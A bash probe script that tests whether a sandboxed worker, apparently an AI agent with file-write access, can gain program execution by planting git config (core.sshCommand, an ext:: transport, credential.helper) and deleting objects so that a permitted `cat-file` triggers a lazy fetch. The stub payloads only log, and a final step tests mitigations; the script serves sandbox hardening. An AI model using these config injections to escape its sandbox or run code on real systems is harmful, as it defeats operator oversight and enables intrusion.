#!/usr/bin/env bash
# PROBE — CAN a worker turn the promisor lazy fetch into ACTUAL program execution
# from `cat-file` (the design's ONE permitted post-worker command)?
# Threat model per Lane X E7: the worker's `Write` reaches $GIT_COMMON_DIR/** with
# no git command at all. So it may (a) write .git/config and (b) delete a loose object.
set -u
. "$(dirname "$0")/lib.sh"
ROOT="$(mktemp -d)"; echo "ROOT=$ROOT"; echo "git: $(git --version)"
LOG="$ROOT/fired.log"; : > "$LOG"
mkprog() { printf '#!/bin/sh\nprintf "EXEC:%%s argv=[%%s]\\n" "%s" "$*" >> "%s"\nexit 1\n' "$1" "$LOG" > "$ROOT/$1"; chmod 0755 "$ROOT/$1"; echo "$ROOT/$1"; }
SSHP="$(mkprog sshcommand-prog)"; EXTP="$(mkprog ext-prog)"; CREDP="$(mkprog credhelper-prog)"

newrepo() {  # $1 = dir
  git init -q -b main "$1"; git -C "$1" config user.email a@b; git -C "$1" config user.name a
  mkdir -p "$1/d"; printf 'SECRETPAYLOAD\n' > "$1/d/big.txt"; printf 'x\n' > "$1/o.txt"
  git -C "$1" add -A; git -C "$1" commit -qm one
}
loosepath() { local r="$1" o="$2"; echo "$r/.git/objects/${o:0:2}/${o:2}"; }

echo "########## STEP 1 — worker deletes a loose object; NO promisor config ##########"
R1="$ROOT/r1"; newrepo "$R1"; B1="$(git -C "$R1" rev-parse HEAD)"; O1="$(git -C "$R1" rev-parse HEAD:d/big.txt)"
arm_hooks "$R1/.git/hooks" "$LOG"
LP="$(loosepath "$R1" "$O1")"; echo "  loose object: $LP  exists=$([ -f "$LP" ] && echo yes || echo no)"
run "CONTROL cat-file blob <oid> BEFORE deletion" "$LOG" git -C "$R1" cat-file blob "$O1"
rm -f "$LP"; echo "  deleted. exists=$([ -f "$LP" ] && echo yes || echo no)"
run "cat-file blob <oid> AFTER deletion, no promisor" "$LOG" git -C "$R1" cat-file blob "$O1"
echo "  verbose: $(timeout 15 git -C "$R1" cat-file blob "$O1" 2>&1 </dev/null | head -2 | tr '\n' '|')"

echo
echo "########## STEP 2 — + worker-planted promisor remote over ssh:// + core.sshCommand ##########"
R2="$ROOT/r2"; newrepo "$R2"; B2="$(git -C "$R2" rev-parse HEAD)"; O2="$(git -C "$R2" rev-parse HEAD:d/big.txt)"
arm_hooks "$R2/.git/hooks" "$LOG"
cat >> "$R2/.git/config" <<CFG
[extensions]
	partialClone = evil
[remote "evil"]
	url = ssh://nosuchhost.invalid/repo.git
	promisor = true
	fetch = +refs/heads/*:refs/remotes/evil/*
[core]
	sshCommand = $SSHP
CFG
rm -f "$(loosepath "$R2" "$O2")"
echo "  object absent? $([ -f "$(loosepath "$R2" "$O2")" ] && echo no || echo yes)"
run "PC branch"                                    "$LOG" git -C "$R2" branch z5pc "$B2"
run "cat-file blob <ABSENT>  [PERMITTED CMD]"      "$LOG" git -C "$R2" cat-file blob "$O2"
echo "  verbose: $(timeout 25 git -C "$R2" cat-file blob "$O2" 2>&1 </dev/null | head -3 | tr '\n' '|')"
echo "  fired now: [$(cat "$LOG" | tr '\n' ' ')]"
run "cat-file --batch <<ABSENT [PERMITTED CMD]"    "$LOG" sh -c "printf '%s\n' $O2 | timeout 20 git -C '$R2' cat-file --batch"
run "ls-tree -r -z --long BASE [PERMITTED CMD]"    "$LOG" git -C "$R2" ls-tree -r -z --long "$B2"
run "rev-parse --verify HEAD^{commit}"             "$LOG" git -C "$R2" rev-parse --verify 'HEAD^{commit}'
run "worktree add --no-checkout -b [Z-4]"          "$LOG" git -C "$R2" worktree add --quiet --no-checkout -b z5w "$ROOT/w2" "$B2"

echo
echo "########## STEP 3 — ext:: transport + worker-set protocol.ext.allow=always ##########"
R3="$ROOT/r3"; newrepo "$R3"; B3="$(git -C "$R3" rev-parse HEAD)"; O3="$(git -C "$R3" rev-parse HEAD:d/big.txt)"
arm_hooks "$R3/.git/hooks" "$LOG"
cat >> "$R3/.git/config" <<CFG
[extensions]
	partialClone = evil
[remote "evil"]
	url = ext::$EXTP %S
	promisor = true
	fetch = +refs/heads/*:refs/remotes/evil/*
[protocol "ext"]
	allow = always
CFG
rm -f "$(loosepath "$R3" "$O3")"
run "cat-file blob <ABSENT> + protocol.ext.allow=always" "$LOG" git -C "$R3" cat-file blob "$O3"
echo "  verbose: $(timeout 25 git -C "$R3" cat-file blob "$O3" 2>&1 </dev/null | head -3 | tr '\n' '|')"

echo
echo "########## STEP 4 — https:// remote + credential.helper ##########"
R4="$ROOT/r4"; newrepo "$R4"; B4="$(git -C "$R4" rev-parse HEAD)"; O4="$(git -C "$R4" rev-parse HEAD:d/big.txt)"
arm_hooks "$R4/.git/hooks" "$LOG"
cat >> "$R4/.git/config" <<CFG
[extensions]
	partialClone = evil
[remote "evil"]
	url = https://127.0.0.1:1/repo.git
	promisor = true
	fetch = +refs/heads/*:refs/remotes/evil/*
[credential]
	helper = $CREDP
CFG
rm -f "$(loosepath "$R4" "$O4")"
run "cat-file blob <ABSENT> + credential.helper"   "$LOG" git -C "$R4" cat-file blob "$O4"
echo "  verbose: $(timeout 25 git -C "$R4" cat-file blob "$O4" 2>&1 </dev/null | head -3 | tr '\n' '|')"

echo
echo "########## STEP 5 — does GIT_NO_LAZY_FETCH / -c fetch neutralise it? ##########"
R5="$ROOT/r5"; newrepo "$R5"; B5="$(git -C "$R5" rev-parse HEAD)"; O5="$(git -C "$R5" rev-parse HEAD:d/big.txt)"
arm_hooks "$R5/.git/hooks" "$LOG"
cat >> "$R5/.git/config" <<CFG
[extensions]
	partialClone = evil
[remote "evil"]
	url = ssh://nosuchhost.invalid/repo.git
	promisor = true
[core]
	sshCommand = $SSHP
CFG
rm -f "$(loosepath "$R5" "$O5")"
run "NEG CONTROL cat-file (must FIRE, else step5 proves nothing)" "$LOG" git -C "$R5" cat-file blob "$O5"
run "GIT_NO_LAZY_FETCH=1 cat-file"                 "$LOG" env GIT_NO_LAZY_FETCH=1 git -C "$R5" cat-file blob "$O5"
run "-c core.sshCommand= (blanked) cat-file"       "$LOG" git -C "$R5" -c core.sshCommand= cat-file blob "$O5"
run "-c remote.evil.promisor=false cat-file"       "$LOG" git -C "$R5" -c remote.evil.promisor=false cat-file blob "$O5"
run "-c extensions.partialClone= cat-file"         "$LOG" git -C "$R5" -c extensions.partialClone= cat-file blob "$O5"
run "-c fetch.negotiationAlgorithm=noop cat-file"  "$LOG" git -C "$R5" -c fetch.negotiationAlgorithm=noop cat-file blob "$O5"
echo "ROOT kept at: $ROOT"
